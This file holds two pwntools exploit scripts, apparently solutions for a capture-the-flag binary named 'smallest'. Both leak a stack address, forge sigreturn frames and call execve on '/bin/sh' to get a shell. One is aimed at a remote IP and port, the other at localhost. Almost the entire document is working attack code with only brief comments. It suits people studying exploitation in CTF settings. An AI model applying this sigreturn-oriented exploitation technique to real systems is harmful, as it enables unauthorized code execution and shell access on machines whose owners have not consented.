#http://blog.csdn.net/qq_29343201/article/details/72627439
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

DEBUG = 1
GDB = 0

if DEBUG:
    p = process("./smallest")
else:
    p = remote("106.75.61.55", 20000)

def pwn(addr):
    '''
    addr should be writable address
    '''
    ret_addr = 0x4000b0 # another read
    syscall_addr = 0x4000be # only syscall
    frame = SigreturnFrame()
    frame.rsp = addr # any writable address(maybe in stack)
    frame.rip = ret_addr
    payload = p64(ret_addr)
    payload += 'd' * 8
    payload += str(frame)
    p.send(payload)


    # second read, enter sysreturn
    payload = p64(syscall_addr)
    payload += '\x11' * (15 - len(payload))
    p.send(payload)

    yes = raw_input()
    # another read now, to the choosed addr as rsp
    frame2 = SigreturnFrame()
#    frame2.rsp = addr + 400
    frame2.rax = constants.SYS_execve
    frame2.rdi = addr + 400
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_addr
    payload = p64(ret_addr)
    payload += 'b' * 8
    payload += str(frame2)
    payload += 'a' * (400 - len(payload))
    payload += '/bin/sh\x00'
#    payload += p64(addr + 400)

    p.send(payload)

    yes = raw_input()

    # another sigreturn
    payload = p64(syscall_addr)
    payload += '\x00' * (0xf - len(payload))
    p.send(payload)


def leak():
    read_again = 0x4000b0
    rdi_syscall_addr = 0x4000bb
    payload = p64(read_again)
    payload += p64(rdi_syscall_addr)
    payload += p64(read_again)
    p.send(payload)

    yes = raw_input()
    p.send('\xbb')
    recved = p.recvuntil('\x7f') # env argument in stack
    then = p.recv()
    leak = u64(recved[-6:] + then[:2])
    log.info("leaking:" + hex(leak))
    return leak

def main():
    if GDB:
        pwnlib.gdb.attach(p)
    #leak()
    addr = leak() & 0xfffffffffffffff000
    addr -= 0x2000
    log.info("on addr: " + hex(addr))
    pwn(addr)
    p.interactive()

if __name__ == '__main__':
    main()











from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
## set start addr three times
payload = p64(start_addr) * 3
sh.send(payload)
gdb.attach(sh)
## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
## get stack addr
sh.send('\xb3')
stack_addr = u64(sh.recv()[8:16])
log.success('leak stack addr :' + hex(stack_addr))

## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)
sh.send(payload)

## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'b' * 7
sh.send(sigreturn)

## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
sh.send(payload)
sh.send(sigreturn)
sh.interactive()
